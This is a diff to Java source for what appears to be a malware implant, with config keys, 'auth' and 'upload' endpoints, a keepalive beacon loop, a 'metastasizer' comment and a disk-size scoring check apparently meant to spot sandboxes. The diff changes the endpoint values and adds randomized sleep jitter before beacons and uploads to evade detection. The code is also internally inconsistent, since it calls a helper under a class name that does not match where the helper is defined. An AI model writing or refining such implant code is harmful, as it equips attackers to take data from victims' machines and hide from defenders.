@@ -10,7 +10,9 @@ import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.Hashtable;
+import java.util.Random;
 import java.util.UUID;
+import java.util.concurrent.TimeUnit;
 import java.util.Base64;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
@@ -69,8 +71,8 @@ class nConfig
     public static String passMat = "T__+Pmv.REW=u9iXBB-";
     public static Hashtable endpoints = new Hashtable(){
         {
-            put("auth","0000");
-            put("upload","0001");
+            put("auth","60000");
+            put("upload","60001");
         }
     };
 }
@@ -102,6 +104,8 @@ public class nCore
         //execute initial 
         //start loop
         //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
+        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
+
         keepalive();
     }
 
@@ -233,6 +237,7 @@ public class nCore
             for (int d=0;d<output.size();d++)
             {
                 try {
+                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,4))*1000);
                     String cReq = nComm.request(nComm.mkAuth(),"upload");
                 }
                 catch (Exception e)
@@ -241,6 +246,7 @@ public class nCore
                 }
             }
         }
+        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
         keepalive();
     }
 
@@ -374,6 +380,11 @@ public class nCore
 
     private static class utilitarian
     {
+        private int rngenerator(int rangeMin, int rangeMax)
+        {
+            Random rand = new Random();
+            return (rand.nextInt((rangeMax - rangeMin) + 1) + rangeMin);
+        }
 
         private Hashtable getMethodByName(Class cData, String methodName) throws ClassNotFoundException
         {
@@ -631,6 +642,9 @@ public class nCore
             //score the system
             int score = 0;
 
+            //check for domain info, +1 if missing
+
+            //
 
             //<40gb (+5), <60gb (+3), <80gb (+1)
             long diskSpace = new File("/").getTotalSpace();
